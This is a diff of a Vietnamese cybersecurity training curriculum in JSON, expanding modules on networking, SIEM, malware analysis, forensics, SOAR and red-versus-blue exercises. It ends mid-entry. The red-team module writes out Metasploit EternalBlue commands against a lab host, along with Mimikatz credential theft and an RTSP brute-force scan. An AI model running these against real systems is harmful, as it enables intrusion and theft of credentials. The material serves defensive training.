@@ -2,129 +2,288 @@
   "1": {
     "title": "NETWORKING & OPERATING SYSTEM FUNDAMENTALS",
     "level": "Cơ bản",
-    "objective": "Hiểu sâu về mô hình mạng, giao thức và lệnh hệ thống làm nền tảng cho phân tích sự cố.",
+    "objective": "Cung cấp kiến thức nền tảng chuyên sâu về mô hình mạng, giao thức, và các lệnh hệ thống để hỗ trợ phân tích và xử lý sự cố mạng hiệu quả. Học viên sẽ hiểu cách hoạt động của các giao thức quan trọng, cấu trúc gói tin, và cách quản lý hệ thống trên cả Linux và Windows, làm tiền đề cho các kỹ năng an ninh mạng cao cấp hơn.",
     "theory": [
-      {"text": "Giới thiệu mô hình OSI, TCP/IP và các giao thức quan trọng (HTTP/HTTPS, DNS, SMTP, SNMP)."},
-      {"text": "Kiến thức chi tiết về Linux (các lệnh: grep, tcpdump, netstat, iptables, systemctl) và Windows (Event Viewer, PowerShell, Task Manager, Windows Firewall)."},
-      {"text": "Phân tích cấu trúc gói tin: IP, TCP, UDP, ICMP và quy trình kết nối (TCP 3-way handshake)."},
-      {"text": "Giới thiệu kiến trúc zero-trust: Xác thực liên tục và kiểm soát truy cập."},
-      {"text": "Công cụ: Wireshark (v4.2.3), Linux (grep, tcpdump, netstat, iptables, systemctl), Windows (Event Viewer, PowerShell, Task Manager, Windows Firewall)."}
+      {
+        "text": "**Giới thiệu mô hình OSI và TCP/IP**: Mô hình OSI (Open Systems Interconnection) chia quá trình truyền thông thành 7 tầng: Physical (truyền tín hiệu qua cáp đồng, quang), Data Link (quản lý frame, địa chỉ MAC, giao thức như Ethernet), Network (định tuyến gói tin qua IP), Transport (đảm bảo truyền dữ liệu bằng TCP hoặc UDP), Session (duy trì phiên kết nối), Presentation (mã hóa/giải mã dữ liệu, như SSL/TLS), Application (giao diện người dùng, như HTTP). Mô hình TCP/IP đơn giản hơn với 4 tầng: Link (kết hợp Physical và Data Link), Internet (tương ứng Network), Transport (TCP/UDP), Application (bao gồm Session, Presentation, Application). Ví dụ: Khi truy cập website, tầng Transport dùng TCP để thiết lập kết nối qua quy trình 3-way handshake (SYN → SYN-ACK → ACK), trong khi tầng Application xử lý dữ liệu HTTP."
+      },
+      {
+        "text": "**Phân tích giao thức quan trọng**: HTTP/HTTPS (HTTP mã hóa qua TLS, handshake TLS gồm ClientHello, ServerHello, trao đổi khóa); DNS (phân giải tên miền qua hệ thống phân cấp root server → TLD → authoritative server, bản ghi như A, CNAME); SMTP (gửi email qua relay, xử lý mã lỗi như 250 OK, 550 Mailbox Unavailable); SNMP (quản lý thiết bị qua OID - Object Identifier và MIB - Management Information Base). Ví dụ: Truy vấn DNS cho 'example.com' gửi gói UDP tới server 8.8.8.8, trả về IP 93.184.216.34."
+      },
+      {
+        "text": "**Kiến thức hệ điều hành**: Trên Linux, học viên học các lệnh như `ip addr show` (kiểm tra cấu hình IP), `netstat -tulnp` (liệt kê cổng đang mở), `tcpdump -i eth0 port 80` (bắt gói tin HTTP), `iptables -L -v` (xem luật firewall), `systemctl restart sshd` (quản lý dịch vụ SSH). Trên Windows, sử dụng Event Viewer (phân tích log với Event ID 4624 - đăng nhập thành công), PowerShell (`Get-NetTCPConnection` để xem trạng thái kết nối), Task Manager (giám sát tài nguyên), Windows Firewall (cấu hình qua GUI hoặc netsh). So sánh: Linux mạnh về dòng lệnh, Windows tích hợp GUI thân thiện."
+      },
+      {
+        "text": "**Phân tích cấu trúc gói tin**: Gói tin IP có header 20 byte (phiên bản, TTL, protocol như 6-TCP, 17-UDP), TCP header (cổng nguồn/đích, sequence number, cờ như SYN, ACK, FIN), UDP header (cổng, checksum), ICMP (type 8 - echo request, type 0 - echo reply). Học viên học cách đọc gói tin qua Wireshark, như phân tích 3-way handshake (SYN với sequence number X, SYN-ACK với X+1, ACK xác nhận) hoặc phát hiện fragmented packets (IP fragment offset > 0)."
+      },
+      {
+        "text": "**Kiến trúc zero-trust**: Nguyên tắc 'không tin tưởng mặc định', yêu cầu xác thực liên tục (MFA - Multi-Factor Authentication), kiểm soát truy cập qua RBAC (Role-Based Access Control), và giám sát hành vi bằng UEBA (User and Entity Behavior Analytics). Ví dụ: Một nhân viên truy cập server nội bộ từ IP lạ sẽ bị yêu cầu xác thực lại qua OTP, ngay cả khi đã đăng nhập trước đó."
+      },
+      {
+        "text": "**Công cụ phân tích**: Wireshark (v4.2.3) để bắt và phân tích gói tin (bộ lọc như `tcp.port == 443` cho HTTPS), Linux (`tcpdump -i eth0 -w capture.pcap` để lưu gói tin, `grep 'error' /var/log/syslog` để tìm lỗi), Windows (`Get-WinEvent -LogName System` để truy xuất log, `netsh advfirewall show allprofiles` để kiểm tra firewall). Ví dụ: Phân tích lưu lượng HTTPS để phát hiện tấn công SSL stripping."
+      }
     ],
     "labs": [
-      {"id": 1, "title": "Sử dụng Wireshark (phiên bản 4.2.3)", "description": "Bắt gói tin HTTP/HTTPS, áp dụng bộ lọc nâng cao (ví dụ: http.request.method == 'POST') để phân tích luồng dữ liệu."},
-      {"id": 2, "title": "Thực hành trên Linux", "description": "Kiểm tra cấu hình mạng (ifconfig, ip), xác định kết nối (netstat -tulnp), tạo luật lọc bằng iptables."},
-      {"id": 3, "title": "Trên Windows", "description": "Dùng PowerShell để truy xuất log hệ thống (Get-EventLog), cấu hình Windows Firewall qua GUI và lệnh netsh."},
-      {"id": 4, "title": "Mô phỏng kiểm soát truy cập zero-trust", "description": "Trên Linux bằng cách cấu hình iptables để chỉ cho phép kết nối từ IP cụ thể."}
+      {
+        "id": 1,
+        "title": "Sử dụng Wireshark (v4.2.3) để phân tích lưu lượng mạng",
+        "description": "Học viên cài Wireshark, bắt gói tin HTTP/HTTPS từ trình duyệt (ví dụ: truy cập google.com), áp dụng bộ lọc `http.request.method == \"GET\"` để xem yêu cầu GET, hoặc `tcp.flags.reset == 1` để phát hiện gói RST (reset) từ tấn công DoS. Phân tích chi tiết luồng TCP: thời gian handshake, kích thước gói, và các gói bị mất (retransmission)."
+      },
+      {
+        "id": 2,
+        "title": "Thực hành quản lý mạng trên Linux",
+        "description": "Cấu hình IP tĩnh (`ip addr add 192.168.1.10/24 dev eth0`), kiểm tra cổng đang mở (`netstat -tulnp | grep :80`), bắt gói tin (`tcpdump -i eth0 -c 100 -n port 443`), tạo luật firewall (`iptables -A INPUT -p tcp --dport 22 -j ACCEPT` để chỉ cho phép SSH, `iptables -A INPUT -j DROP` để chặn tất cả khác). Học viên kiểm tra kết quả bằng lệnh `nmap` từ máy khác."
+      },
+      {
+        "id": 3,
+        "title": "Quản lý hệ thống trên Windows",
+        "description": "Dùng PowerShell để liệt kê kết nối hoạt động (`Get-NetTCPConnection -State Established | Select LocalAddress, RemoteAddress`), xem log đăng nhập thất bại (`Get-WinEvent -LogName Security | Where-Object {$_.Id -eq 4625}`), cấu hình firewall (`netsh advfirewall firewall add rule name=\"Allow HTTPS\" dir=in action=allow protocol=TCP localport=443`). Học viên kiểm tra bằng cách mở trình duyệt và xem log."
+      },
+      {
+        "id": 4,
+        "title": "Mô phỏng kiểm soát truy cập zero-trust",
+        "description": "Trên Linux, cấu hình iptables để chỉ cho phép SSH từ IP cụ thể (`iptables -A INPUT -p tcp --dport 22 -s 192.168.1.100 -j ACCEPT`, `iptables -A INPUT -p tcp --dport 22 -j DROP`), kiểm tra bằng cách SSH từ IP khác nhau. Học viên ghi nhận kết quả: IP ngoài danh sách bị từ chối."
+      }
     ],
-    "expectedResult": "Học viên có thể phân tích gói tin, kiểm tra cấu hình mạng và áp dụng biện pháp bảo mật cơ bản.",
+    "expectedResult": "Học viên nắm vững cách phân tích gói tin mạng, quản lý cấu hình mạng trên Linux và Windows, và áp dụng nguyên tắc zero-trust để tăng cường bảo mật. Họ sẽ thành thạo Wireshark, tcpdump, PowerShell, và các lệnh cơ bản để giám sát, cấu hình, và xử lý sự cố mạng trong các tình huống thực tế.",
     "icon": "Terminal"
   },
   "2": {
     "title": "LOGGING & SIEM (SPLUNK, ELK, QRADAR)",
     "level": "Cơ bản",
-    "objective": "Nắm vững cách thu thập, lưu trữ và phân tích log để phát hiện sự kiện bất thường.",
+    "objective": "Trang bị kỹ năng thu thập, lưu trữ, và phân tích log hệ thống để phát hiện sự kiện bất thường và giám sát an ninh mạng. Học viên sẽ hiểu các loại log khác nhau, kiến trúc SIEM, và cách triển khai các công cụ như Splunk, ELK Stack, và QRadar trong môi trường doanh nghiệp.",
     "theory": [
-      {"text": "Phân loại log: Syslog, JSON, Windows Event Log, CEF."},
-      {"text": "Kiến trúc SIEM: Xây dựng quy tắc (rule), dashboard và phân tích tương quan (correlation)."},
-      {"text": "Giới thiệu các công cụ: Splunk (v9.4.1), ELK Stack (v8.17.3), QRadar (v7.5.0 Update Package 8)."}
+      {
+        "text": "**Phân loại log**: Syslog (chuẩn RFC 5424, định dạng gồm timestamp, hostname, severity, message như `Dec 10 10:00:00 host1 sshd: Failed password`), JSON (dữ liệu cấu trúc với key-value, dễ phân tích bằng SIEM), Windows Event Log (Event ID 4624 - đăng nhập thành công, 4625 - thất bại, lưu trong XML), CEF (Common Event Format của ArcSight, ví dụ: `CEF:0|Vendor|Product|1.0|100|Login Failure|5|src=192.168.1.10`). Học viên học cách đọc log để phát hiện sự cố như brute-force."
+      },
+      {
+        "text": "**Kiến trúc SIEM**: Quy trình gồm thu thập log từ nguồn (firewall Cisco ASA, IDS Snort, máy chủ Apache/IIS), lưu trữ tập trung (database như Elasticsearch), xử lý (normalize log để đồng bộ định dạng), phân tích (rule-based detection như '10 lần lỗi 4625 trong 5 phút', correlation để phát hiện APT), và trực quan hóa (dashboard với biểu đồ thời gian thực). Ví dụ: Phát hiện tấn công DNS tunneling bằng cách so sánh lưu lượng DNS bất thường (query dài, tần suất cao) với log firewall."
+      },
+      {
+        "text": "**Công cụ SIEM**: Splunk (v9.4.1) dùng ngôn ngữ SPL (`index=main sourcetype=access_combined | stats count by clientip` để đếm truy cập theo IP), ELK Stack (v8.17.3) gồm Elasticsearch (lưu trữ log), Logstash (xử lý qua pipeline, ví dụ: lọc log Apache), Kibana (trực quan hóa qua Lens hoặc Dashboard), QRadar (v7.5.0 Update Package 8) với AI anomaly detection (phát hiện đăng nhập từ IP lạ dựa trên baseline hành vi)."
+      }
     ],
     "labs": [
-      {"id": 1, "title": "Cài đặt Splunk/ELK", "description": "Cấu hình forwarder trên Linux (/etc/syslog.conf) và Windows (Universal Forwarder) để thu thập log."},
-      {"id": 2, "title": "Xây dựng dashboard tùy chỉnh trong Splunk", "description": "Theo dõi log từ tường lửa, IDS và máy chủ (ví dụ: biểu đồ số lần đăng nhập thất bại)."},
-      {"id": 3, "title": "Viết quy tắc correlation trong QRadar", "description": "Phát hiện tấn công brute-force (ví dụ: 10 lần đăng nhập thất bại trong 5 phút)."},
-      {"id": 4, "title": "Phân tích log Windows Event", "description": "Phát hiện các sự kiện đăng nhập đáng ngờ (ví dụ: Event ID 4624)."}
+      {
+        "id": 1,
+        "title": "Cài đặt và cấu hình Splunk/ELK",
+        "description": "Trên Linux, cấu hình syslog gửi log tới SIEM (`/etc/rsyslog.conf` thêm `*.* @192.168.1.100:514`), cài Filebeat để thu thập log Apache (`/var/log/apache2/access.log`). Trên Windows, cài Splunk Universal Forwarder, cấu hình thu thập log IIS (`C:\\inetpub\\logs\\LogFiles`). Học viên kiểm tra log hiển thị trên Splunk Web hoặc Kibana."
+      },
+      {
+        "id": 2,
+        "title": "Xây dựng dashboard tùy chỉnh trong Splunk",
+        "description": "Tạo dashboard với truy vấn `index=main sourcetype=access_combined | timechart count by status` để hiển thị số lần truy cập theo mã trạng thái (200, 404, 500), thêm biểu đồ cột cho top 10 IP nguồn (`| top 10 clientip`), và heatmap cho mật độ truy cập theo giờ. Học viên lưu dashboard và kiểm tra trên giao diện Splunk."
+      },
+      {
+        "id": 3,
+        "title": "Viết quy tắc correlation trong QRadar",
+        "description": "Thiết lập quy tắc: 'Nếu Event ID 4625 xuất hiện >10 lần từ cùng IP trong 300 giây, gửi email cảnh báo tới admin@company.com'. Học viên dùng QRadar Rule Wizard, mô phỏng tấn công brute-force bằng script (như Hydra) và kiểm tra cảnh báo."
+      },
+      {
+        "id": 4,
+        "title": "Phân tích log Windows Event",
+        "description": "Dùng PowerShell (`Get-WinEvent -LogName Security -MaxEvents 100 | Where-Object {$_.Id -eq 4625} | Select TimeCreated, @{Name='IP';Expression={$_.Properties[19].Value}}`) để lọc log đăng nhập thất bại, phân tích thời gian và IP nguồn, phát hiện mẫu tấn công (như đăng nhập lặp lại từ 192.168.1.200)."
+      }
     ],
-    "expectedResult": "Học viên tự tin triển khai SIEM, phân tích log và tạo báo cáo giám sát an ninh.",
+    "expectedResult": "Học viên tự tin triển khai hệ thống SIEM, cấu hình thu thập log từ nhiều nguồn, phân tích log thời gian thực, tạo dashboard trực quan, và viết quy tắc phát hiện sự cố. Họ sẽ thành thạo Splunk SPL, ELK Stack, và QRadar để giám sát và bảo vệ hệ thống mạng doanh nghiệp.",
     "icon": "Server"
   },
   "3": {
     "title": "MALWARE ANALYSIS & THREAT HUNTING",
     "level": "Chuyên sâu",
-    "objective": "Phát hiện, phân tích mã độc và áp dụng MITRE ATT&CK để săn mối đe dọa.",
+    "objective": "Phát triển kỹ năng phát hiện, phân tích mã độc và áp dụng MITRE ATT&CK để chủ động săn tìm mối đe dọa trong hệ thống. Học viên sẽ học cách phân tích tĩnh/động, xây dựng IOC, và sử dụng các công cụ như ANY.RUN, YARA, Ghidra để điều tra mã độc.",
     "theory": [
-      {"text": "Kỹ thuật phân tích mã độc: Static (hash, strings) và Dynamic (sandbox, hành vi)."},
-      {"text": "Khái niệm IOC (Indicators of Compromise) và ứng dụng MITRE ATT&CK Framework (v14)."},
-      {"text": "Công cụ: ANY.RUN (v2025), VirusTotal, YARA (v4.5.0), Ghidra (v11.0)."}
+      {
+        "text": "**Kỹ thuật phân tích mã độc**: Phân tích tĩnh (static analysis) xem mã nguồn không chạy, dùng công cụ như `strings` (trích xuất chuỗi văn bản), hash (MD5, SHA256 để so sánh với cơ sở dữ liệu mã độc), PEiD (xác định packer). Phân tích động (dynamic analysis) chạy mã độc trong sandbox (ANY.RUN) để quan sát hành vi (kết nối C2, sửa registry). Ví dụ: Một file EXE có hash SHA256 'e3b0c442...' được phân tích tĩnh để tìm chuỗi 'cmd.exe', sau đó chạy động để ghi nhận kết nối tới IP 203.0.113.5."
+      },
+      {
+        "text": "**Khái niệm IOC và MITRE ATT&CK**: IOC (Indicators of Compromise) là dấu hiệu như hash (MD5: d41d8cd98...), IP C2 (203.0.113.5), tên file (malware.exe). MITRE ATT&CK (v14) là khung phân loại kỹ thuật tấn công, như T1078 (Valid Accounts - dùng tài khoản hợp lệ để xâm nhập), T1059 (Command and Scripting Interpreter - chạy PowerShell độc hại). Học viên học cách ánh xạ IOC vào ATT&CK để hiểu chiến thuật kẻ tấn công."
+      },
+      {
+        "text": "**Công cụ phân tích**: ANY.RUN (v2025) chạy sandbox online, ghi lại hành vi (network, process, file); VirusTotal (quét file qua 70+ engine); YARA (v4.5.0) viết quy tắc phát hiện (dựa trên chuỗi, byte); Ghidra (v11.0) reverse engineering mã nguồn (phân tích hàm C như CreateProcess). Ví dụ: Dùng Ghidra để tìm hàm mã hóa XOR trong mã độc ransomware."
+      }
     ],
     "labs": [
-      {"id": 1, "title": "Phân tích file nghi vấn", "description": "Qua ANY.RUN và VirusTotal, ghi nhận IOC (hash MD5, SHA256, C2 IP)."},
-      {"id": 2, "title": "Viết quy tắc YARA", "description": "Phát hiện mã độc dựa trên chuỗi đặc trưng (ví dụ: $magic = {4D 5A})."},
-      {"id": 3, "title": "Xây dựng kịch bản threat hunting trong ELK", "description": "So sánh log trước/sau tấn công, ánh xạ theo MITRE ATT&CK (T1078 – Valid Accounts)."},
-      {"id": 4, "title": "Sử dụng Ghidra", "description": "Phân tích mã độc, xác định các hàm đáng ngờ và kỹ thuật mã hóa."}
+      {
+        "id": 1,
+        "title": "Phân tích file nghi vấn qua ANY.RUN và VirusTotal",
+        "description": "Tải file EXE lên ANY.RUN, chạy trong sandbox Windows 10, ghi nhận IOC (hash SHA256, IP C2 như 203.0.113.5, file tạo ra như temp.bat), sau đó quét qua VirusTotal để đối chiếu (40/70 engine phát hiện Trojan). Học viên soạn báo cáo IOC."
+      },
+      {
+        "id": 2,
+        "title": "Viết quy tắc YARA để phát hiện mã độc",
+        "description": "Dùng `strings` trích xuất chuỗi từ file EXE (tìm 'cmd.exe', 'http://evil.com'), viết quy tắc YARA: `rule Malware { strings: $a = \"cmd.exe\" $b = \"evil.com\" condition: $a and $b }`. Học viên kiểm tra quy tắc trên tập mẫu mã độc."
+      },
+      {
+        "id": 3,
+        "title": "Xây dựng kịch bản threat hunting trong ELK",
+        "description": "Tải log hệ thống vào Elasticsearch, dùng Kibana phân tích log trước/sau tấn công (query: `event.code:4624 AND user.name:admin`), ánh xạ theo MITRE T1078 (Valid Accounts). Học viên phát hiện đăng nhập bất thường từ IP lạ và đề xuất cách ly."
+      },
+      {
+        "id": 4,
+        "title": "Sử dụng Ghidra để phân tích mã độc",
+        "description": "Mở file EXE trong Ghidra, phân tích hàm main, tìm hàm nghi ngờ (CreateProcess, WinExec), giải mã chuỗi XOR (key 'secret'), xác định payload (kết nối C2). Học viên ghi nhận kỹ thuật mã hóa và đề xuất IOC."
+      }
     ],
-    "expectedResult": "Học viên xác định mã độc, xây dựng quy tắc phát hiện và ứng dụng framework săn mối đe dọa.",
+    "expectedResult": "Học viên có thể xác định mã độc qua phân tích tĩnh/động, xây dựng quy tắc YARA, sử dụng ELK để săn mối đe dọa, và reverse engineering bằng Ghidra. Họ sẽ thành thạo ứng dụng MITRE ATT&CK để phát hiện và phản ứng với mã độc trong hệ thống thực tế.",
     "icon": "Search"
   },
   "4": {
     "title": "INCIDENT RESPONSE & DIGITAL FORENSICS",
     "level": "Chuyên sâu",
-    "objective": "Nắm quy trình phản ứng sự cố và áp dụng công cụ pháp y số để điều tra.",
+    "objective": "Nắm vững quy trình phản ứng sự cố theo tiêu chuẩn NIST và kỹ năng pháp y số để thu thập, phân tích chứng cứ số. Học viên sẽ học cách điều tra trên hệ thống, đám mây, và thiết bị di động, sử dụng các công cụ như Volatility, Autopsy, FTK Imager.",
     "theory": [
-      {"text": "Quy trình Incident Response (NIST SP 800-61): Chuẩn bị, Phát hiện, Cách ly, Khắc phục, Phục hồi."},
-      {"text": "Pháp y số: Công cụ Volatility (v3.2.1.0), Autopsy (v4.21.0), FTK Imager (v4.7.3.81)."},
-      {"text": "Phản ứng sự cố trong đám mây (AWS CloudTrail, Azure Sentinel)."},
-      {"text": "Pháp y số trên thiết bị di động và IoT."}
+      {
+        "text": "**Quy trình Incident Response (NIST SP 800-61)**: Chuẩn bị (xây dựng playbook, cài đặt SIEM), Phát hiện/Phân tích (xác định sự cố qua log, IOC), Cách ly (ngắt kết nối máy nhiễm), Khắc phục (xóa mã độc, vá lỗ hổng), Phục hồi (khôi phục hệ thống, kiểm tra lại). Ví dụ: Phát hiện ransomware qua log bất thường (nhiều file .encrypted), cách ly bằng cách ngắt mạng."
+      },
+      {
+        "text": "**Pháp y số**: Volatility (v3.2.1.0) phân tích memory dump (tìm process ẩn), Autopsy (v4.21.0) kiểm tra hệ thống file (timeline, registry), FTK Imager (v4.7.3.81) tạo ảnh đĩa (hash MD5/SHA1 để bảo toàn chứng cứ). Ví dụ: Dùng Volatility tìm tiến trình cmd.exe ẩn trong RAM."
+      },
+      {
+        "text": "**Phản ứng sự cố trong đám mây**: AWS CloudTrail ghi lại API call (như CreateInstance từ IP lạ), Azure Sentinel phân tích log (dùng KQL: `SecurityEvent | where EventID == 4625`). Ví dụ: Phát hiện truy cập trái phép vào S3 bucket qua log CloudTrail."
+      },
+      {
+        "text": "**Pháp y số trên thiết bị di động và IoT**: Thu thập dữ liệu từ Android (ADB để trích xuất log, SQLite database), iOS (backup qua iTunes), IoT (firmware từ camera IP). Ví dụ: Phân tích log cuộc gọi từ Android để tìm dấu vết tấn công."
+      }
     ],
     "labs": [
-      {"id": 1, "title": "Thu thập và phân tích memory dump bằng Volatility", "description": "vol.py -f memory.dmp pslist để phát hiện tiến trình nghi ngờ."},
-      {"id": 2, "title": "Sử dụng Autopsy", "description": "Kiểm tra hệ thống file, truy xuất browser history và phân tích Windows Registry."},
-      {"id": 3, "title": "Phân tích log AWS CloudTrail", "description": "Phát hiện truy cập trái phép, soạn báo cáo sự cố với khuyến nghị khắc phục."},
-      {"id": 4, "title": "Thu thập và phân tích dữ liệu từ thiết bị di động", "description": "Ví dụ: Android bằng công cụ như ADB và Cellebrite."}
+      {
+        "id": 1,
+        "title": "Thu thập và phân tích memory dump bằng Volatility",
+        "description": "Tải file memory.dmp, chạy `vol.py -f memory.dmp --profile=Win10x64 pslist` để liệt kê tiến trình, `netscan` để xem kết nối mạng, tìm tiến trình nghi ngờ (cmd.exe với PID bất thường). Học viên ghi nhận IOC như IP C2."
+      },
+      {
+        "id": 2,
+        "title": "Sử dụng Autopsy để điều tra hệ thống file",
+        "description": "Mở ảnh đĩa E01 trong Autopsy, phân tích timeline (file sửa đổi gần đây), truy xuất browser history (Chrome: History SQLite), kiểm tra registry (HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run) để tìm malware autostart."
+      },
+      {
+        "id": 3,
+        "title": "Phân tích log AWS CloudTrail",
+        "description": "Tải log CloudTrail JSON, dùng Athena query (`SELECT eventName, sourceIPAddress FROM cloudtrail WHERE eventTime > '2025-03-01'`) để phát hiện API call bất thường (DeleteBucket từ IP lạ), soạn báo cáo với khuyến nghị (chặn IP, bật MFA)."
+      },
+      {
+        "id": 4,
+        "title": "Thu thập dữ liệu từ thiết bị di động",
+        "description": "Dùng ADB trên Android (`adb shell logcat > log.txt` để trích xuất log, `adb pull /data/data/com.app` để lấy dữ liệu ứng dụng), phân tích bằng Cellebrite UFED (tìm tin nhắn SMS nghi ngờ). Học viên báo cáo dấu vết tấn công."
+      }
     ],
-    "expectedResult": "Học viên thu thập chứng cứ, phân tích dữ liệu pháp y và soạn báo cáo điều tra chuyên nghiệp.",
+    "expectedResult": "Học viên thành thạo quy trình NIST, thu thập chứng cứ số từ RAM, đĩa, đám mây, và thiết bị di động, phân tích dữ liệu pháp y bằng Volatility, Autopsy, và soạn báo cáo điều tra chuyên nghiệp với khuyến nghị khắc phục.",
     "icon": "Shield"
   },
   "5": {
     "title": "SOC OPERATIONS & AUTOMATION (SOAR)",
     "level": "Senior",
-    "objective": "Tích hợp và tự động hóa quy trình điều tra, nâng cao hiệu quả SOC.",
+    "objective": "Tích hợp và tự động hóa quy trình điều tra an ninh mạng, nâng cao hiệu quả hoạt động SOC. Học viên sẽ học cách xây dựng SOC hiện đại, triển khai SOAR (Cortex XSOAR, Splunk SOAR), và ứng dụng AI để giảm thời gian phản ứng.",
     "theory": [
-      {"text": "Cấu trúc SOC hiện đại: Vai trò Tier 1, Tier 2, Tier 3 và luồng công việc."},
-      {"text": "SOAR: Lợi ích và công cụ như Cortex XSOAR (v8.9), Splunk SOAR."},
-      {"text": "Ứng dụng AI trong tự động hóa: Phát hiện bất thường bằng máy học."}
+      {
+        "text": "**Cấu trúc SOC hiện đại**: Tier 1 (giám sát log, xử lý cảnh báo cơ bản), Tier 2 (phân tích sâu, điều tra sự cố), Tier 3 (săn mối đe dọa, phát triển chiến lược). Luồng công việc: cảnh báo từ SIEM → phân tích IOC → cách ly → báo cáo. Ví dụ: Tier 1 phát hiện 100 request/phút từ IP lạ, Tier 2 xác định DDoS."
+      },
+      {
+        "text": "**SOAR**: Security Orchestration, Automation, and Response giảm thời gian phản ứng bằng playbook (tự động kiểm tra IP qua VirusTotal), tích hợp SIEM/EDR. Công cụ: Cortex XSOAR (v8.9) với workflow designer, Splunk SOAR với Phantom playbooks. Ví dụ: Tự động chặn IP sau 5 lần đăng nhập thất bại."
+      },
+      {
+        "text": "**Ứng dụng AI trong tự động hóa**: Phát hiện bất thường bằng máy học (anomaly detection với Isolation Forest), phân loại cảnh báo (supervised learning với Random Forest). Ví dụ: Huấn luyện mô hình scikit-learn để phát hiện lưu lượng web bất thường dựa trên số request và thời gian."
+      }
     ],
     "labs": [
-      {"id": 1, "title": "Phát triển playbook Python tự động gửi email cảnh báo", "description": "Khi phát hiện sự cố (dùng thư viện smtplib)."},
-      {"id": 2, "title": "Tích hợp cảnh báo từ Splunk vào Cortex XSOAR", "description": "Tự động hóa điều tra (ví dụ: kiểm tra IP qua VirusTotal)."},
-      {"id": 3, "title": "Thiết lập script tự động phân tích log", "description": "Đặt ngưỡng cảnh báo (ví dụ: >100 request/phút) và đề xuất can thiệp."},
-      {"id": 4, "title": "Sử dụng máy học", "description": "Ví dụ: scikit-learn để phát hiện bất thường trong log truy cập web."}
+      {
+        "id": 1,
+        "title": "Phát triển playbook Python tự động gửi email cảnh báo",
+        "description": "Viết script Python dùng smtplib: `if failed_logins > 10: smtp.sendmail('soc@company.com', 'admin@company.com', 'Subject: Brute Force Detected')`. Học viên chạy script với log giả lập (10 lần lỗi 4625), kiểm tra email gửi đi."
+      },
+      {
+        "id": 2,
+        "title": "Tích hợp cảnh báo từ Splunk vào Cortex XSOAR",
+        "description": "Cấu hình Splunk gửi cảnh báo (`index=main failed_login | where count > 5`) tới Cortex XSOAR qua API, tạo playbook tự động kiểm tra IP qua VirusTotal, chặn IP nếu malicious. Học viên kiểm tra kết quả trên dashboard XSOAR."
+      },
+      {
+        "id": 3,
+        "title": "Thiết lập script tự động phân tích log",
+        "description": "Viết script Python phân tích log Apache (`awk '{print $1}' access.log | sort | uniq -c`), đặt ngưỡng (>100 request/phút từ IP), gửi cảnh báo qua Slack (`requests.post('slack_webhook', data={'text': 'DDoS detected'})`). Học viên đề xuất chặn IP."
+      },
+      {
+        "id": 4,
+        "title": "Ứng dụng máy học để phát hiện bất thường",
+        "description": "Dùng scikit-learn huấn luyện Isolation Forest trên log truy cập web (feature: số request, thời gian), dự đoán bất thường (ví dụ: 500 request trong 1 phút), trực quan hóa kết quả bằng matplotlib. Học viên đánh giá độ chính xác mô hình."
+      }
     ],
-    "expectedResult": "Học viên xây dựng giải pháp tự động hóa, giảm thời gian phản ứng và nâng cao hiệu quả SOC.",
+    "expectedResult": "Học viên xây dựng được giải pháp tự động hóa bằng Python, tích hợp SIEM với SOAR, áp dụng máy học để phát hiện bất thường, giảm thời gian phản ứng từ hàng giờ xuống vài phút, và tối ưu hóa hoạt động SOC trong môi trường thực tế.",
     "icon": "Box"
   },
   "6": {
     "title": "RED TEAM VS BLUE TEAM & ADVERSARY SIMULATION",
     "level": "Senior",
-    "objective": "Hiểu chiến thuật tấn công của Red Team và phản ứng của Blue Team qua mô phỏng.",
+    "objective": "Hiểu chiến thuật tấn công của Red Team và kỹ năng phản ứng của Blue Team qua mô phỏng thực tế. Học viên sẽ học TTPs của kẻ tấn công, sử dụng Metasploit, Mimikatz, và phòng thủ bằng Sysmon, EDR trong các kịch bản tấn công/phòng thủ.",
     "theory": [
-      {"text": "Phân tích TTPs (Tactics, Techniques, Procedures) của kẻ tấn công."},
-      {"text": "Công cụ tấn công: Metasploit (v6.4), Mimikatz, Cobalt Strike."},
-      {"text": "Công cụ phòng thủ: Sysmon (v15.14), EDR (CrowdStrike, SentinelOne)."},
-      {"text": "Mô phỏng tấn công vào thiết bị IoT."}
+      {
+        "text": "**Phân tích TTPs**: Tactics (mục tiêu như Initial Access), Techniques (cách thực hiện như Phishing - T1566), Procedures (quy trình cụ thể của nhóm APT). Ví dụ: APT29 dùng spear-phishing (T1566.001) để cài backdoor."
+      },
+      {
+        "text": "**Công cụ tấn công**: Metasploit (v6.4) khai thác lỗ hổng (MS17-010 EternalBlue), Mimikatz (trích xuất mật khẩu từ LSASS), Cobalt Strike (mô phỏng APT với beacon). Ví dụ: Dùng Metasploit chạy `exploit/windows/smb/ms17_010_eternalblue` để chiếm quyền máy Windows."
+      },
+      {
+        "text": "**Công cụ phòng thủ**: Sysmon (v15.14) ghi log chi tiết (Event ID 1 - process creation), EDR như CrowdStrike (phát hiện hành vi bất thường), SentinelOne (chặn tiến trình độc hại). Ví dụ: Sysmon ghi lại Mimikatz chạy với Event ID 1."
+      },
+      {
+        "text": "**Mô phỏng tấn công IoT**: Khai thác camera IP qua lỗ hổng firmware (default password), giao thức RTSP (Real-Time Streaming Protocol). Ví dụ: Dùng `nmap -p 554 --script rtsp-url-brute` để tìm URL RTSP."
+      }
     ],
     "labs": [
-      {"id": 1, "title": "Mô phỏng tấn công phishing và khai thác lỗ hổng", "description": "Bằng Metasploit, theo dõi phản ứng từ SIEM."},
-      {"id": 2, "title": "Phân tích log tấn công qua Sysmon", "description": "Xác định hành vi bất thường (ví dụ: mimikatz.exe chạy)."},
-      {"id": 3, "title": "Thực hành Atomic Red Team", "description": "T1059 – Command and Scripting Interpreter, chạy playbook tự động phản ứng."},
-      {"id": 4, "title": "Mô phỏng tấn công vào thiết bị IoT", "description": "Ví dụ: camera IP, phát hiện và phản ứng từ Blue Team."}
+      {
+        "id": 1,
+        "title": "Mô phỏng tấn công phishing và khai thác lỗ hổng",
+        "description": "Red Team dùng Metasploit (`use exploit/windows/smb/ms17_010_eternalblue`, `set RHOST 192.168.1.10`) để khai thác máy Windows, Blue Team theo dõi qua Splunk (`index=main sourcetype=sysmon process_name=mimikatz`). Học viên ghi nhận phản ứng."
+      },
+      {
+        "id": 2,
+        "title": "Phân tích log tấn công qua Sysmon",
